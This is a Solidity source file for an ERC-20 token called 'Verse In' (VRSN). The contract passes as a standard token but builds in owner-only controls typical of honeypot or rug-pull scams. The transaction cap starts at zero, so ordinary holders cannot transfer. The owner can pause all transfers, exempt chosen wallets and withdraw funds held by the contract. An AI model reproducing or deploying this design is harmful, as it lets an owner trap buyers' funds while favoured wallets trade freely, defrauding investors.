
pragma solidity ^0.8.7;
// SPDX-License-Identifier: No License


             
interface IERC20 {
    function transfer(address _to, uint256 _amount) external returns (bool);
}   

contract Versein {
    string public constant _name = "Verse In";
    string public constant _symbol = "VRSN";
    uint8 public constant _decimals = 10;
    uint256 public _totalSupply = 0;        
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private allowances;
    
    bool public isPaused = false;
    uint256 public _maxPerTransaction = 0;
                mapping (address => bool) public _isExcludedFromMaxTransaction;

    address public _owner = address(0);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor () {
        emit OwnershipTransferred(_owner, msg.sender);
        _owner = msg.sender;
        _totalSupply = 1000000000 * 10**_decimals;
        balances[_owner] = _totalSupply;
    }
    
    receive () external payable {}
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Error: caller is not the owner");
        _;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    function getOwner() public view returns (address) {
        return _owner;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "Error: transfer from the zero address");
        require(recipient != address(0), "Error: transfer to the zero address");
        
        require(!isPaused, "Error: token is temporary paused");
        if(!_isExcludedFromMaxTransaction[sender]) {
        require(amount <= _maxPerTransaction, "Error: exceeds max transaction limit");
    }

        uint256 senderBalance = balances[sender];
        require(senderBalance >= amount, "Error: transfer amount exceeds balance");
        balances[sender] = senderBalance - amount;
        balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "Error: approve from the zero address");
        require(spender != address(0), "Error: approve to the zero address");

        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        uint256 currentAllowance = allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Error: transfer amount exceeds allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

    function withdraw(uint256 amount) public payable onlyOwner returns (bool) {
        require(amount <= address(this).balance, "Error: withdrawal amount exceeds balance");
        payable(msg.sender).transfer(amount);
        return true;
    }
                
    function withdrawToken(address tokenContract, uint256 amount) public virtual onlyOwner {
        IERC20 _tokenContract = IERC20(tokenContract);
        _tokenContract.transfer(msg.sender, amount);
    }

    function burn(uint256 amount) public onlyOwner returns (bool) {
        require(balances[msg.sender] >= amount, "Error: burn amount exceeds balance");
        balances[msg.sender] = balances[msg.sender] - amount;
        _totalSupply = _totalSupply - amount;
        emit Transfer(msg.sender, address(0), amount);
        return true;
    }

    

    

    function setPauseStatus(bool status) public onlyOwner returns (bool) {
        isPaused = status;
        return true;
    }

    function setMaxPerTransaction(uint256 amount) public onlyOwner returns (bool) {
        _maxPerTransaction = amount;
        return true;
    }
    function setExcludedFromMaxTransaction(address wallet, bool status) public onlyOwner returns (bool) {
        _isExcludedFromMaxTransaction[wallet] = status;
        return true;
    }
    
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return allowances[owner][spender];
    }
    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowances[msg.sender][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "Error: decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Error: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
